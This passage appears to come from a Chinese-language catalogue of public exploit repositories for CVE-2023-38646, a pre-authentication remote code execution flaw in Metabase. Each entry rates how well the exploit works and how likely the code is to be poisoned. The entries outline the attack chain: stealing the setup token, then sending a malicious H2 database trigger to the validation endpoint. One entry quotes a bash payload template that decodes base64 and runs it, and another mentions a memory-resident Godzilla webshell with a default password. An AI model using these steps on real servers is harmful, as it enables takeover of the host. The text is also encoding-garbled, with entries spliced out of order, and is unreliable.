**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­çš„ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢å¼•æ“ç»“æœï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨çš„æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æ¼æ´åˆ©ç”¨æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢å¼•æ“ç»“æœä»¥åŠæä¾›çš„PoCä»£ç ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚å­˜åœ¨å¤šä¸ªå…¬å¼€çš„PoCï¼Œè¯æ˜è¯¥æ¼æ´å¯ä»¥è¢«æˆåŠŸåˆ©ç”¨ã€‚

æä¾›çš„PoCä»£ç  `CVE-2023-38646-POC.py` æ—¨åœ¨è·å– Metabase å®ä¾‹çš„ setup-tokenã€‚å¦‚æœ Metabase å®ä¾‹å¤„äºæœªè®¾ç½®çŠ¶æ€ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤ token è¿›è¡Œåˆå§‹åŒ–è®¾ç½®ï¼Œå¹¶è¿›ä¸€æ­¥åˆ©ç”¨å…¶ RCE çš„èƒ½åŠ›ã€‚

æä¾›çš„PoCä»£ç  `CVE-2023-38646-Reverse-Shell.py` å¯èƒ½ç”¨äºæ›´è¿›ä¸€æ­¥çš„åˆ©ç”¨ï¼Œå°è¯•è·å–Metabaseçš„ç‰ˆæœ¬ä¿¡æ¯å’Œsetup tokenã€‚

**æŠ•æ¯’é£é™©ï¼š**

PoC ä»£ç  `CVE-2023-38646-POC.py` ä¸»è¦åŠŸèƒ½æ˜¯å‘ç°æœªé…ç½®çš„ Metabase å®ä¾‹å¹¶è·å– setup tokenï¼Œæœ¬èº«æ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚ ä½†æ˜¯ï¼Œä¸èƒ½å®Œå…¨æ’é™¤å…¶ä½œè€…åœ¨ä»£ç ä¸­éšè—æ¶æ„ä»£ç çš„å¯èƒ½æ€§ï¼Œä¾‹å¦‚åœ¨è·å– token åå°è¯•æ‰§è¡Œå…¶ä»–æ“ä½œï¼Œæˆ–è€…å°† token å‘é€åˆ°å¤–éƒ¨æœåŠ¡å™¨ã€‚é£é™©è¯„ä¼°ä¸º 10%ã€‚

PoC ä»£ç  `CVE-2023-38646-Reverse-Shell.py` åŒæ ·æ˜¯æ¼æ´åˆ©ç”¨ç›¸å…³ï¼Œä¸»è¦æ¶‰åŠè·å–setup tokenç­‰ä¿¡æ¯ã€‚éœ€è¦äººå·¥å®¡è®¡è¯¥éƒ¨åˆ†ä»£ç ï¼Œè¿›ä¸€æ­¥ç¡®è®¤æ˜¯å¦å­˜åœ¨æ¤å…¥åé—¨çš„é£é™©ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **ä¿¡æ¯æ”¶é›†ï¼š** æ”»å‡»è€…é¦–å…ˆéœ€è¦ç¡®å®šç›®æ ‡ Metabase å®ä¾‹çš„ç‰ˆæœ¬æ˜¯å¦åœ¨å—å½±å“çš„èŒƒå›´å†…ã€‚é€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹å¯ä»¥è·å– Metabase ç‰ˆæœ¬ã€‚
2.  **è·å–Setup Token (å¦‚æœæœªè®¾ç½®):** å¦‚æœ Metabase å®ä¾‹å°šæœªå®Œæˆåˆå§‹åŒ–è®¾ç½®ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹è·å– setup-tokenã€‚è¿™ä¸ªtokenå¯ä»¥ç”¨æ¥å®ŒæˆMetabaseçš„åˆå§‹åŒ–ã€‚
3.  **æ‰§è¡Œä»»æ„ä»£ç ï¼š**  åˆ©ç”¨è·å–çš„setup tokenæˆ–è€…å…¶ä»–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„è¯·æ±‚æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚å…·ä½“ RCE çš„åˆ©ç”¨æ–¹å¼å¯èƒ½æ¶‰åŠå¤šä¸ªæ­¥éª¤ï¼Œä¾‹å¦‚é€šè¿‡åˆ›å»ºä¸€ä¸ªæ¶æ„çš„æ•°æ®æºæˆ–ä»ªè¡¨æ¿ï¼Œè§¦å‘ä»£ç æ‰§è¡Œã€‚

æ€»è€Œè¨€ä¹‹ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨ç›¸å¯¹ç®€å•ï¼Œå±å®³æ€§æé«˜ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´å®Œå…¨æ§åˆ¶å—å½±å“çš„ Metabase æœåŠ¡å™¨ã€‚ 

**é¡¹ç›®åœ°å€:** [XiaomingX/cve-2023-38646-poc](https://github.com/XiaomingX/cve-2023-38646-poc)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #15

**æ¥æº**: [CVE-2023-38646-Zenmovie_CVE-2023-38646.md](../2023/CVE-2023-38646-Zenmovie_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** 0.46.6.1ä¹‹å‰ç‰ˆæœ¬ï¼Œ1.46.6.1ä¹‹å‰Enterpriseç‰ˆæœ¬ï¼Œä»¥åŠå…¶ä»–å—å½±å“çš„å›ºå®šç‰ˆæœ¬ä¹‹å‰çš„ç‰ˆæœ¬

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ Metabase å®ä¾‹å¯ä»æ”»å‡»è€…æ§åˆ¶çš„ç½‘ç»œè®¿é—®ï¼Œæ— éœ€èº«ä»½éªŒè¯

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´æ˜¯ Metabase ä¸­ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚ æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢å¼•æ“ç»“æœå’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨çš„æœ‰æ•ˆæ€§å¾ˆé«˜ã€‚

**æœ‰æ•ˆæ€§:**

*   æ¼æ´åº“ä¿¡æ¯æ˜ç¡®æŒ‡å‡ºè¯¥æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
*   æœç´¢å¼•æ“ç»“æœç¡®è®¤äº†è¯¥æ¼æ´çš„ä¸¥é‡æ€§ï¼Œå¹¶æä¾›äº†å¤šä¸ªå…³äºè¯¥æ¼æ´çš„æè¿°ã€å½±å“å’ŒæŠ€æœ¯ç»†èŠ‚çš„ç½‘é¡µé“¾æ¥ï¼ŒåŒ…æ‹¬PoCä»£ç çš„GitHubé“¾æ¥ã€‚
*   æä¾›çš„PoCä»£ç  (`CVE-2023-38646.py`) çœ‹èµ·æ¥æ˜¯ä¸€ä¸ªå®Œæ•´çš„æ¼æ´åˆ©ç”¨è„šæœ¬ï¼Œå®ƒåˆ©ç”¨äº† Metabase çš„ `setup-token` å’Œ H2 æ•°æ®åº“çš„ç‰¹æ€§æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼:**

1.  **è·å– Setup Token å’Œ Metabase ç‰ˆæœ¬:** PoC é¦–å…ˆå‘ `/api/session/properties` å‘é€ GET è¯·æ±‚ï¼Œæ£€ç´¢ `setup-token` å’Œ Metabase ç‰ˆæœ¬ã€‚
2.  **æ„é€  Payload:**  æ„å»ºåå¼¹ shell çš„ payload, å¹¶å¯¹å…¶è¿›è¡Œ Base64 ç¼–ç ã€‚
3.  **æ„é€ Exploitæ•°æ®:** PoC æ„å»ºä¸€ä¸ªåŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON æ•°æ®ã€‚è¯¥å­—ç¬¦ä¸²åŒ…å«ä¸€ä¸ªåˆ©ç”¨ `CREATE TRIGGER` çš„ payloadï¼Œè¯¥è§¦å‘å™¨åœ¨ `INFORMATION_SCHEMA.TABLES` ä¸Šæ‰§è¡Œ `SELECT` æ“ä½œä¹‹å‰æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚`token` å­—æ®µæ‹¼æ¥äº† setup token å’Œ base64 ç¼–ç åçš„ payloadã€‚
4.  **å‘é€æ¶æ„è¯·æ±‚:** PoC å‘ `/api/setup/validate` å‘é€å¸¦æœ‰æ„é€ çš„ JSON æ•°æ®çš„ POST è¯·æ±‚ã€‚è¿™ä¸ªè¯·æ±‚ä¼šè§¦å‘ H2 æ•°æ®åº“è¿æ¥å’Œè§¦å‘å™¨ï¼Œä»è€Œæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æŠ•æ¯’é£é™©:**

PoCä»£ç æœ¬èº«çš„åå¼¹shellè¿æ¥åœ°å€æ˜¯å¯ä»¥é…ç½®çš„, å¦‚æœä½œè€…æƒ³æŠ•æ¯’,å¯ä»¥å°†IPåœ°å€å†™æ­»,æˆ–è€…åŠ å…¥å…¶ä»–æ¶æ„æ“ä½œ.
*   æ¼æ´åˆ©ç”¨ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œå…¶ç›®çš„æ˜¯æ˜ç¡®çš„ã€‚
*   `README.md` æ–‡ä»¶åªåŒ…å« PoC çš„åŸºæœ¬ä¿¡æ¯ã€‚

å› æ­¤ï¼Œè¯¥ä»“åº“ä¸­å­˜åœ¨ä½œè€…éšè—çš„æŠ•æ¯’ä»£ç çš„é£é™©è¾ƒä½, å¤§æ¦‚åœ¨10%å·¦å³ã€‚æŠ•æ¯’çš„ä¸»è¦é£é™©åœ¨äºæ¶æ„ä¿®æ”¹payloadï¼Œä¾‹å¦‚åå¼¹shellåœ°å€æˆ–è€…æ’å…¥å…¶ä»–çš„æ¶æ„æ“ä½œã€‚

**é¡¹ç›®åœ°å€:** [Zenmovie/CVE-2023-38646](https://github.com/Zenmovie/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #16

**æ¥æº**: [CVE-2023-38646-acesoyeo_METABASE-RCE-CVE-2023-38646-.md](../2023/CVE-2023-38646-acesoyeo_METABASE-RCE-CVE-2023-38646-.md)

# CVE-2023-38646

> ğŸ“¦ è¯¥CVEæœ‰ **27** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2023-38646-0utl4nder_Another-Metabase-RCE-CVE-2023-38646.md](../2023/CVE-2023-38646-0utl4nder_Another-Metabase-RCE-CVE-2023-38646.md)

## CVE-2023-38646 - Metabase Pre-Auth RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** Metabaseå®ä¾‹å¯å…¬å¼€è®¿é—®æˆ–æ”»å‡»è€…ä½äºåŒä¸€ç½‘ç»œ

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œè·å¾—æœåŠ¡å™¨æƒé™ã€‚æ¼æ´å­˜åœ¨äº Metabase 0.46.6.1 ä¹‹å‰çš„å¼€æºç‰ˆæœ¬å’Œ 1.46.6.1 ä¹‹å‰çš„ä¼ä¸šç‰ˆæœ¬ã€‚

**æœ‰æ•ˆæ€§åˆ†æï¼š**
æ ¹æ®æœç´¢ç»“æœï¼Œå·²ç»æœ‰å…¬å¼€çš„ PoC ä»£ç å¯ç”¨ (ä¾‹å¦‚ï¼Œgithub.com/threatHNTR/CVE-2023-38646)ã€‚æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç åŸºäº Assetnote çš„ä¸€ç¯‡å…³äºè¯¥æ¼æ´åˆ†æçš„æ–‡ç« ã€‚å®ƒé€šè¿‡åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥é…ç½®ä¸­æ‰§è¡Œæ¶æ„ä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒé€šè¿‡æ„é€ ä¸€ä¸ªæ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥ URLï¼Œåœ¨è¿æ¥æ•°æ®åº“æ—¶è§¦å‘æ¶æ„ä»£ç çš„æ‰§è¡Œã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹æ­¥éª¤ï¼š

1.  **æ„é€ æ¶æ„ JSON Payload:**  è¯¥ JSON payload ç”¨äºåˆ›å»ºæˆ–ä¿®æ”¹ Metabase ä¸­çš„æ•°æ®åº“è¿æ¥ã€‚ å…¶ä¸­ `classname` è¢«è®¾ç½®ä¸º `org.h2.Driver` , `subname` åŒ…å«æ¶æ„çš„ H2 è¿æ¥å­—ç¬¦ä¸²,å­—ç¬¦ä¸²åˆ©ç”¨ H2 çš„ `CREATE TRIGGER` ç‰¹æ€§ï¼Œåœ¨INFORMATION_SCHEMA.TABLESä¸Šåˆ›å»ºä¸€ä¸ªè§¦å‘å™¨, è¯¥è§¦å‘å™¨ä¼šåœ¨æ¯æ¬¡æŸ¥è¯¢è¯¥è¡¨æ—¶æ‰§è¡ŒåµŒå…¥çš„ JavaScript ä»£ç , JavaScriptä»£ç è´Ÿè´£æ‰§è¡Œå‘½ä»¤.
2.  **å‘é€Payload:** é€šè¿‡å‘é€ POST è¯·æ±‚åˆ° Metabase API ç«¯ç‚¹ï¼ˆé€šå¸¸æ˜¯ /api/setup/validate æˆ–å…¶ä»–ç›¸å…³ç«¯ç‚¹ï¼‰ï¼Œå°†æ„é€ çš„ JSON payload å‘é€ç»™ Metabase æœåŠ¡å™¨ã€‚ç”±äºè¯¥æ¼æ´æ˜¯æœªç»èº«ä»½éªŒè¯çš„ï¼Œå› æ­¤æ— éœ€æä¾›ä»»ä½•èº«ä»½éªŒè¯ä¿¡æ¯ã€‚
3.  **è§¦å‘ RCE:** Metabase æœåŠ¡å™¨å°è¯•ä½¿ç”¨æä¾›çš„é…ç½®è¿æ¥åˆ° H2 æ•°æ®åº“æ—¶ï¼Œæ¶æ„çš„ H2 è¿æ¥å­—ç¬¦ä¸²ä¼šè¢«è§£æå’Œæ‰§è¡Œï¼Œä»è€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
è¯¥ PoC çš„ä¸»è¦ç›®çš„æ˜¯æ¼”ç¤ºå¦‚ä½•åˆ©ç”¨è¯¥æ¼æ´ã€‚ åˆ†æä»£ç ï¼Œå‘ç°é«˜é£é™©çš„è¡Œä¸ºæ˜¯æ‰§è¡Œ `java.lang.Runtime.getRuntime().exec('bash -c {echo,BASE64COMMAND}|{base64,-d}|{bash,-i}')`ã€‚è¿™è¡Œä»£ç å…è®¸æ‰§è¡Œä»»æ„çš„ bash å‘½ä»¤ã€‚æŠ•æ¯’é£é™©ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

*   **å‘½ä»¤æ³¨å…¥é£é™©ï¼š**  è™½ç„¶ä»£ç ä¸­ä½¿ç”¨äº† Base64 ç¼–ç ï¼Œä½†æ”»å‡»è€…ä»ç„¶å¯èƒ½é€šè¿‡ä¿®æ”¹ Base64 ç¼–ç çš„å†…å®¹æ¥æ³¨å…¥æ¶æ„å‘½ä»¤ã€‚
*   **æƒé™æå‡é£é™©ï¼š**  ç”±äºä»£ç ä»¥ Metabase æœåŠ¡å™¨çš„æƒé™è¿è¡Œï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥é€šè¿‡è¯¥æ¼æ´æå‡æƒé™ã€‚

åŸºäºä»¥ä¸Šåˆ†æï¼Œæˆ‘è®¤ä¸ºè¯¥ PoC ä»£ç å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£é™©ã€‚é£é™©ä¸»è¦æ¥è‡ªäºå‘½ä»¤æ³¨å…¥çš„å¯èƒ½æ€§ï¼Œä½†è¿™å–å†³äºå¦‚ä½•ä½¿ç”¨å’Œä¿®æ”¹ PoCã€‚æ•´ä½“æŠ•æ¯’å¯èƒ½æ€§è¾ƒä½ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘è®¤ä¸ºè¯¥ PoC ä»£ç çš„æŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦1%ã€‚å› ä¸ºä½œè€…å·²ç»è¯´æ˜äº†è¿™æ˜¯ä¸€ä¸ªæ¼æ´çš„æ‰©å±•ï¼Œæ„åœ¨è§£å†³ä¸€äº›ç‰¹å®šæƒ…å†µä¸‹çš„åˆ©ç”¨é—®é¢˜ï¼Œå¹¶ä¸”ä¸»è¦ä»£ç é€»è¾‘æ˜¯åˆ©ç”¨å·²çŸ¥æ¼æ´ï¼Œè€Œä¸æ˜¯å¼•å…¥æ–°çš„ã€éšè”½çš„æ¶æ„ä»£ç ã€‚


**é¡¹ç›®åœ°å€:** [0utl4nder/Another-Metabase-RCE-CVE-2023-38646](https://github.com/0utl4nder/Another-Metabase-RCE-CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #2

**æ¥æº**: [CVE-2023-38646-AnvithLobo_CVE-2023-38646.md](../2023/CVE-2023-38646-AnvithLobo_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source before 0.46.6.1 and Metabase Enterprise before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯é€šè¿‡ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2023-38646å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´åˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œåœ¨å»ºç«‹æ•°æ®åº“è¿æ¥æ—¶æ‰§è¡Œé¢„å…ˆè®¾å®šçš„Javaä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œåˆ©ç”¨æ–¹å¼æ˜¯ï¼š

1.  **è·å–Tokenï¼š** é¦–å…ˆï¼Œé€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹è·å–ä¸€ä¸ªsetup tokenã€‚
2.  **æ„é€ Payloadï¼š**  ç„¶åï¼Œæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„JSON payloadã€‚è¿™ä¸ªè¿æ¥å­—ç¬¦ä¸²ä¸­åˆ©ç”¨`CREATE TRIGGER`è¯­å¥åˆ›å»ºè§¦å‘å™¨ï¼Œåœ¨`INFORMATION_SCHEMA.TABLES`è¡¨ä¸Šæ‰§è¡Œ`SELECT`æ“ä½œå‰è§¦å‘ã€‚è§¦å‘å™¨æ‰§è¡Œçš„JavaScriptä»£ç ä½¿ç”¨`java.lang.Runtime.getRuntime().exec()`æ‰§è¡Œåå‘shellå‘½ä»¤ã€‚
3.  **Base64ç¼–ç ï¼š** ä½¿ç”¨Base64å¯¹åå‘shellæŒ‡ä»¤è¿›è¡Œç¼–ç ï¼Œé¿å…ç‰¹æ®Šå­—ç¬¦å½±å“ã€‚
4.  **å‘é€Payloadï¼š**  æœ€åï¼Œå°†æ„é€ å¥½çš„JSON payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ï¼Œè§¦å‘æ¼æ´ã€‚

**æœ‰æ•ˆæ€§ï¼š**  æä¾›çš„PoCä»£ç æœ‰æ•ˆï¼Œå¯ä»¥æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´ã€‚

**æŠ•æ¯’é£é™©ï¼š**  ä»£ç ä¸­æ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’è¡Œä¸ºã€‚è„šæœ¬çš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´å¹¶æ‰§è¡Œåå‘shellã€‚ä½œè€…æä¾›çš„ä»£ç é€»è¾‘æ¸…æ™°ï¼Œæ²¡æœ‰å‘ç°ä»»ä½•æ¶æ„ä»£ç ç‰‡æ®µæˆ–è€…éšè—çš„åé—¨ã€‚è¯¥è„šæœ¬çš„åŠŸèƒ½ä¸æè¿°ä¸€è‡´ï¼Œç›®çš„æ˜¯åˆ©ç”¨Metabaseçš„æ¼æ´æ¥è·å–è¿œç¨‹ä»£ç æ‰§è¡Œæƒé™ã€‚å› æ­¤, æŠ•æ¯’é£é™©è¯„ä¼°ä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [AnvithLobo/CVE-2023-38646](https://github.com/AnvithLobo/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #3

**æ¥æº**: [CVE-2023-38646-Boogipop_MetabaseRceTools.md](../2023/CVE-2023-38646-Boogipop_MetabaseRceTools.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1, Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªæ‰“è¡¥ä¸ï¼Œä¸”æ”»å‡»è€…å¯ä»¥è®¿é—®MetabaseæœåŠ¡ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæƒé™çº§åˆ«ä¸æœåŠ¡å™¨ç›¸åŒã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å½±å“ Metabase å¼€æºç‰ˆæœ¬ä½äº 0.46.6.1 å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ä½äº 1.46.6.1 çš„å®ä¾‹ã€‚æ¼æ´åˆ©ç”¨æ–¹å¼åˆ†æå¦‚ä¸‹ï¼š

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æœªæˆæƒè®¿é—®ï¼š** è¯¥æ¼æ´æ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨ã€‚
2.  **RCEï¼š**  æ”»å‡»è€…å¯ä»¥å‘é€ç‰¹åˆ¶çš„è¯·æ±‚ï¼Œæ‰§è¡ŒæœåŠ¡å™¨ä¸Šçš„ä»»æ„å‘½ä»¤ã€‚
3.  **å…·ä½“åˆ©ç”¨ï¼š** æ ¹æ®æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ”»å‡»æµç¨‹ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹æ­¥éª¤ï¼š
    *   **éªŒè¯æ¨¡å—ï¼š**  å‘`/api/session/properties`ç«¯ç‚¹å‘é€è¯·æ±‚ï¼Œè·å–æœªæˆæƒçš„tokenï¼Œç¡®è®¤æ¼æ´æ˜¯å¦å­˜åœ¨ã€‚
    *   **å‘½ä»¤æ‰§è¡Œæ¨¡å—ï¼š** åˆ©ç”¨ä¸Šä¸€æ­¥è·å–çš„tokenï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚éœ€è¦æŒ‡å®šmetabase.jarçš„ä½ç½®ã€‚
    *   **å†…å­˜é©¬æ³¨å…¥æ¨¡å—ï¼š** é€šè¿‡ä¿®æ”¹`x-client-data`è¯·æ±‚å¤´æ³¨å…¥å†…å­˜é©¬ï¼Œæ”¯æŒ cmd å’Œ godzilla ä¸¤ç§æ¨¡å¼ã€‚cmdæ¨¡å¼ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œgodzillaæ¨¡å¼åˆ™ç›´æ¥è¿æ¥å“¥æ–¯æ‹‰webshellã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æä¾›çš„ä»£ç æ˜¯ä¸€ä¸ª Metabase RCE å›¾å½¢åŒ–åˆ©ç”¨å·¥å…·ï¼ŒåŒ…å«äº†éªŒè¯æ¨¡å—ã€å‘½ä»¤æ‰§è¡Œæ¨¡å—å’Œå†…å­˜é©¬æ³¨å…¥æ¨¡å—ã€‚ä¸»è¦çš„æ½œåœ¨æŠ•æ¯’é£é™©å­˜åœ¨äºä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

1.  **å†…å­˜é©¬æ³¨å…¥ï¼š** å†…å­˜é©¬æ³¨å…¥æ¨¡å—æœ¬èº«å…·æœ‰è¾ƒé«˜çš„é£é™©ï¼Œå¯èƒ½è¢«ç”¨äºæ¤å…¥æ¶æ„ä»£ç ï¼Œé•¿æœŸæ§åˆ¶æœåŠ¡å™¨ã€‚ä»£ç ä¸­`x-client-data:godzilla`çš„æ–¹å¼è¿æ¥å“¥æ–¯æ‹‰webshellï¼Œé»˜è®¤å¯†ç ä¸ºpassï¼Œå¯èƒ½ä¼šè¢«å…¶ä»–äººåˆ©ç”¨ã€‚
2.  **å‘½ä»¤æ‰§è¡Œæ¨¡å—ï¼š** è™½ç„¶å‘½ä»¤æ‰§è¡Œæ¨¡å—çš„ç›®çš„æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†æ¶æ„æ”»å‡»è€…å¯èƒ½ä¼šä¿®æ”¹è¯¥æ¨¡å—ï¼Œæ·»åŠ é¢å¤–çš„æ¶æ„è¡Œä¸ºï¼Œä¾‹å¦‚ä¸‹è½½å¹¶æ‰§è¡Œæ¶æ„è„šæœ¬ã€‚

è€ƒè™‘åˆ°ä»¥ä¸Šé£é™©ï¼Œè¯¥POCå·¥å…·å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œå°¤å…¶æ˜¯å†…å­˜é©¬æ¨¡å—ã€‚éœ€è¦åœ¨ä½¿ç”¨å‰è¿›è¡Œä»£ç å®¡è®¡ï¼Œç¡®ä¿æ²¡æœ‰æ¶æ„ä»£ç ã€‚

**é£é™©è¯„ä¼°ï¼š**

